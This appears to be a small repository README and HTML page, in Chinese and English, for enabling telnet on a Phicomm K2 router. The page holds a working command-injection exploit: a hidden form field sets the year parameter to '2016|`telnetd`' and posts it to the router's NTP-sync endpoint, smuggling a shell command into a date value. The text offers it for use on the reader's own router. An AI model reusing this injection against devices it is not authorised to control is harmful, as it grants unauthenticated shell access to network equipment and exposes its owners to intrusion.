# phicomm_k2
斐讯k2路由器远程开启telnet

1.请在本地登陆路由器管理界面，然后使用浏览器打开opnetelnet.html，点击按钮，不出意外就会开启telnetd服务。
2.如果你的phicomm k2 路由器的网关地址修改过，请把html文件里的url修改成你的路由器地址。
3.本方法可能也适用于k1型号路由器。

<html> 
    <head> 
    <meta http-equiv="content-type" content="text/html;charset=utf-8"> 
    <title>phicomm k2 oepn telnetd</title> 
    </head> 
    <style> 
    .main{width:980px;height:600px;margin:0 auto;} 
    .url{width:300px;} 
    .fn{width:60px;} 
    .content{width:80%;height:60%;} 
    </style> 
    <script> 
      function open(){ 
        var url = document.getElementById('url').value, 
          fileName = document.getElementById('exploit').value, 
          form = document.getElementById('fm'); 
        form.action = url; 
        form.submit(); 
      } 
    </script> 
    <body> 
    <div class="main"> 
      <form id="fm" method="post">   
        先登入斐讯k2路由器，然后点击按钮，如果你的路由器的网关不是192.168.2.1，请先修改下面的表单。<br><br>
        Please login your phicomm k2 router,and click the button,if your route's gateway ip is not 192.168.2.1,please modify the form.<br><br><br/> <br/> 
        URL:<input type="text" value="http://192.168.2.1/goform/gra_NTPSyncWithLocal" class="url" id="url"/>&nbsp;&nbsp; 
        <input type="hidden" name="text_year" value="2016|`telnetd`" class="exploit" id="exploit" />
        <a href="javascript:open();">open telnetd</a><br/> <br/> <br/> <br/> <br/> 
        code by ha.cker@Me.com
      </form> 
    </div> 
    </body> 
    </html>
